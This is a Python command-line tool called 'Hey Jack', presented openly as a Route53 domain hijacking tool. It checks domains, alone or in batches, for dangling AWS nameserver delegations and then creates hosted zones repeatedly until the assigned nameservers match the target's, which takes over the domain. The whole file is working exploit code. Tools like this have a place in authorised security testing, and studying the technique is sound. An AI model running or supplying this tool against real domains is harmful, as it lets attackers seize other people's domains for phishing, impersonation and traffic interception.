#!/usr/bin/env python

import time
import sys
import logging
import argparse
import boto3
import botocore
import whois
import dns.resolver
from datetime import datetime

logging.basicConfig(level=logging.INFO)


def parse_command_line(description):
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument('-d', '--domain', type=str, default=None, help='Domain to be hijacked')
    parser.add_argument('-l', '--list', type=str, default=None, help='Comma-separated list of domains')
    parser.add_argument('-i', '--input-file', dest='file', type=str, default=None, help='File containing list of domains (one per line)')
    parser.add_argument('-p', '--profile', type=str, default=None, help='AWS profile from ~/.aws/credentials file')
    parser.add_argument('-a', '--access', type=str, default=None, help='AWS Access Key')
    parser.add_argument('-s', '--secret', type=str, default=None, help='AWS Secret Access Key')
    parser.add_argument('-t', '--token', type=str, default=None, help='AWS Session Token')
    parser.add_argument('-ns', '--nameserver', type=str, default=None, action='append', nargs='*',
                        help='NameServers can be listed here. Ex: -ns ns-001.awsdns-01.com ns-002.awsdns-02.com ')
    parser.add_argument('-v', '--verbose', action='store_true', help='Increase verbosity')
    parser.add_argument('-f', '--force', action='store_true', help='Force to continue if NS were already taken')
    parser.add_argument('-y', '--yes', action='store_true', help='Automatic YES answer when prompted')
    parser.add_argument('-c', '--check-only', action='store_true', dest='check_only', 
                        help='Only check if domain is vulnerable without attempting hijack')
    # TODO custom path to ~/.aws/credentials file
    # TODO quiet parameter
    # TODO output parameter to save the logs in a file
    args = parser.parse_args()
    return args


def get_domains_list(args):
    """Extract domains from arguments."""
    domains = []
    
    if args.domain:
        domains.append(args.domain)
    
    if args.list:
        domains.extend([d.strip() for d in args.list.split(',') if d.strip()])
    
    if args.file:
        try:
            with open(args.file, 'r', encoding='utf-8') as f:
                domains.extend([line.strip() for line in f 
                              if line.strip() and not line.strip().startswith('#')])
        except Exception as e:
            logging.error(f"Error reading file {args.file}: {e}")
            sys.exit(1)
    
    return domains


def get_nameservers(domain, custom_nameservers=None, verbose=False):
    """Get nameservers for a domain."""
    if custom_nameservers:
        if custom_nameservers and custom_nameservers[0]:
            return set(custom_nameservers[0])
        else:
            logging.warning("Custom nameservers provided but empty")
            return None
    
    try:
        if verbose:
            logging.info(f"Querying WHOIS for {domain}...")
        whois_domain = whois.query(domain=domain)
        if not whois_domain:
            logging.warning(f"{domain} does not seem to exist in WHOIS")
            return None
        
        target_name_servers = whois_domain.name_servers
        if not target_name_servers or len(target_name_servers) == 0:
            logging.warning(f'Could not find nameservers for {domain} via WHOIS')
            return None
        
        return set(target_name_servers)
    except Exception as e:
        logging.warning(f"WHOIS query failed for {domain}: {e}")
        return None


def check_aws_nameservers(nameservers):
    """Check if nameservers belong to AWS Route53."""
    if not nameservers:
        return False
    
    for ns in nameservers:
        if 'awsdns' in ns.lower():
            return True
    return False


def check_domain_resolves(domain, verbose=False):
    """Check if domain currently resolves via DNS."""
    try:
        dns.resolver.resolve(domain, 'NS')
        if verbose:
            logging.info(f"Domain {domain} currently resolves")
        return True
    except Exception as e:
        if verbose:
            logging.info(f"Domain {domain} does not resolve: {e}")
        return False


def check_vulnerability(domain, custom_nameservers=None, force=False, verbose=False):
    """Check if a domain is vulnerable to takeover."""
    logging.info(f'\nChecking vulnerability for: {domain}')
    
    nameservers = get_nameservers(domain, custom_nameservers, verbose)
    if not nameservers:
        logging.error(f"Could not retrieve nameservers for {domain}")
        return False, None
    
    if verbose:
        logging.info(f'Found nameservers: {nameservers}')
    
    if not check_aws_nameservers(nameservers):
        logging.warning(f'{domain}: Nameservers do not belong to AWS Route53')
        return False, None
    
    resolves = check_domain_resolves(domain, verbose)
    
    if resolves and not force:
        logging.warning(f'{domain}: Domain currently resolves - not vulnerable (use --force to override)')
        return False, None
    
    if resolves and force:
        logging.warning(f'{domain}: Domain resolves but continuing due to --force flag')
    
    logging.info(f'{domain}: Domain appears vulnerable to takeover!')
    return True, nameservers


def attempt_hijack(domain, target_nameservers, route53_client, verbose=False):
    """Attempt to hijack a domain by creating hosted zones."""
    logging.info(f'\nAttempting hijack for: {domain}')
    logging.info(f'Target nameservers: {target_nameservers}')
    
    counter = 0
    created_zones = []
    failed_zones = []
    successful_zone = None
    
    try:
        while not successful_zone:
            counter += 1
            if verbose:
                logging.info(f'Attempt #{counter}')
            else:
                # Print progress dot for non-verbose mode
                print('.', end='', flush=True)
            
            try:
                new_zone = route53_client.create_hosted_zone(
                    Name=domain,
                    HostedZoneConfig={'Comment': 'HeyJack53 domain hijack!'},
                    CallerReference=f'HeyJack53_{domain}_{datetime.now()}'
                )
            except botocore.exceptions.ClientError as e:
                if e.response['Error']['Code'] == 'Throttling':
                    logging.warning('AWS API throttling - waiting 3 seconds...')
                    time.sleep(3)
                    continue
                else:
                    raise
            
            hosted_zone_id = new_zone.get('HostedZone').get('Id')
            created_zones.append(hosted_zone_id)
            new_name_servers = set(new_zone.get('DelegationSet').get('NameServers'))
            
            if verbose:
                logging.info(f'Created zone {hosted_zone_id} with nameservers: {new_name_servers}')
            
            # Check if ALL target nameservers are in the new nameservers
            # This is the correct logic - we need all of them to match
            if target_nameservers.issubset(new_name_servers):
                successful_zone = hosted_zone_id
                logging.info(f'\n✓ SUCCESS after {counter} attempts!')
                logging.info(f'Hijacked zone ID: {successful_zone}')
                logging.info(f'Matching nameservers: {new_name_servers}')
            else:
                failed_zones.append(hosted_zone_id)
                if verbose:
                    logging.info(f'No match - cleaning up zone {hosted_zone_id}')
        
        # Clean up failed zones
        if failed_zones:
            logging.info(f'Cleaning up {len(failed_zones)} failed zones...')
            for zone_id in failed_zones:
                try:
                    route53_client.delete_hosted_zone(Id=zone_id)
                except botocore.exceptions.ClientError as e:
                    if e.response['Error']['Code'] == 'Throttling':
                        logging.warning('Throttling during cleanup - waiting...')
                        time.sleep(3)
                        try:
                            route53_client.delete_hosted_zone(Id=zone_id)
                        except Exception as cleanup_error:
                            logging.error(f'Failed to delete zone {zone_id}: {cleanup_error}')
                    else:
                        logging.error(f'Failed to delete zone {zone_id}: {e}')
        
        return successful_zone
        
    except KeyboardInterrupt:
        logging.warning('\nInterrupted by user')
        if failed_zones:
            logging.warning(f'{len(failed_zones)} zones need cleanup')
            cleanup = input('Delete leftover zones? (Y/n): ').strip().lower()
            if cleanup != 'n':
                for zone_id in failed_zones:
                    try:
                        route53_client.delete_hosted_zone(Id=zone_id)
                        logging.info(f'Deleted {zone_id}')
                    except Exception as e:
                        logging.error(f'Failed to delete {zone_id}: {e}')
            else:
                logging.warning('Leftover zones:')
                for zone_id in failed_zones:
                    logging.warning(f'  {zone_id}')
        return None
    
    except Exception as e:
        logging.error(f"Unexpected error during hijack: {e}")
        return None


def process_domain(domain, args, route53_client):
    """Process a single domain."""
    logging.info(f'\n{"="*80}')
    logging.info(f'Processing domain: {domain}')
    logging.info(f'{"="*80}')
    
    # Check vulnerability
    is_vulnerable, nameservers = check_vulnerability(
        domain, 
        args.nameserver, 
        args.force, 
        args.verbose
    )
    
    if not is_vulnerable:
        logging.info(f'Domain {domain} is not vulnerable or check failed')
        return {'domain': domain, 'status': 'not_vulnerable', 'zone_id': None}
    
    # If check-only mode, return here
    if args.check_only:
        logging.info(f'Domain {domain} is VULNERABLE (check-only mode)')
        return {'domain': domain, 'status': 'vulnerable', 'zone_id': None}
    
    # Attempt hijack if not in check-only mode
    if not args.yes:
        proceed = input(f'\nAttempt hijack for {domain}? (Y/n): ').strip().lower()
        if proceed == 'n':
            logging.info(f'Skipping {domain}')
            return {'domain': domain, 'status': 'skipped', 'zone_id': None}
    
    zone_id = attempt_hijack(domain, nameservers, route53_client, args.verbose)
    
    if zone_id:
        return {'domain': domain, 'status': 'hijacked', 'zone_id': zone_id}
    else:
        return {'domain': domain, 'status': 'failed', 'zone_id': None}


def main():

    print("""
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░█░░░░█░░░█████░░░░█░░░█░░░░░░░░░░░
    ░░░░░█░░░░█░░██░░░█░░░░█░░░█░░░░░░░░░░░
    ░░░░░██████░░██████░░░░█████░░░░░░░░░░░
    ░░░░░█░░░░█░░██░░░░░░░░░░░░█░░░░░░░░░░░
    ░░░░░█░░░░█░░░████░░░░░░░███░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░███████████░░░░░░░░░░░░░░░░█░░░░░░░
    ░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░█░░█░░░░
    ░░░░░░░░░░█░░░░░░░░░░░░░░░░░░░░█░██░░░░
    ░░░░░░░░░░█░░░░████░░░░░████░░░███░░░░░
    ░░░░░█░░░░█░░░█░░░░█░░░██░░░░░░███░░░░░
    ░░░░░█░░░██░░░█░░░░█░░░█░░░░░░░█░█░░░░░
    ░░░░░█████░░░░███████░░░████░░░█░███░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    """)

    args = parse_command_line("Hey Jack! - Route53 Domain Hijacking Tool")
    
    # Get list of domains to process
    domains = get_domains_list(args)
    
    if not domains:
        logging.error("Please provide at least one domain using -d, -l, or -f")
        sys.exit(1)
    
    logging.info(f'Found {len(domains)} domain(s) to process')
    
    # Setup AWS session
    if args.profile:
        session = boto3.Session(profile_name=args.profile)
    elif args.access and args.secret:
        session = boto3.Session(
            aws_access_key_id=args.access,
            aws_secret_access_key=args.secret,
            aws_session_token=args.token
        )
    else:
        logging.error("AWS authentication required! Use -p for profile or -a/-s for keys")
        sys.exit(1)
    
    route53_client = session.client('route53')
    
    # Display mode information
    if args.check_only:
        logging.info('Running in CHECK-ONLY mode - no hijack attempts will be made')
    
    # Process each domain
    results = []
    for domain in domains:
        try:
            result = process_domain(domain, args, route53_client)
            results.append(result)
        except Exception as e:
            logging.error(f'Error processing {domain}: {e}')
            results.append({'domain': domain, 'status': 'error', 'zone_id': None})
    
    # Summary
    logging.info(f'\n{"="*80}')
    logging.info('SUMMARY')
    logging.info(f'{"="*80}')
    
    vulnerable_count = sum(1 for r in results if r['status'] == 'vulnerable')
    hijacked_count = sum(1 for r in results if r['status'] == 'hijacked')
    failed_count = sum(1 for r in results if r['status'] in ['failed', 'not_vulnerable', 'error'])
    skipped_count = sum(1 for r in results if r['status'] == 'skipped')
    
    for result in results:
        status_icon = {
            'vulnerable': '⚠️',
            'hijacked': '✓',
            'failed': '✗',
            'not_vulnerable': '-',
            'skipped': '○',
            'error': '✗'
        }.get(result['status'], '?')
        
        status_msg = f"{status_icon} {result['domain']}: {result['status'].upper()}"
        if result['zone_id']:
            status_msg += f" (Zone: {result['zone_id']})"
        logging.info(status_msg)
    
    logging.info(f'\nTotal: {len(domains)} domains')
    if args.check_only:
        logging.info(f'Vulnerable: {vulnerable_count}')
        logging.info(f'Not vulnerable: {failed_count}')
    else:
        logging.info(f'Hijacked: {hijacked_count}')
        logging.info(f'Failed: {failed_count}')
        logging.info(f'Skipped: {skipped_count}')


if __name__ == '__main__':
    main()
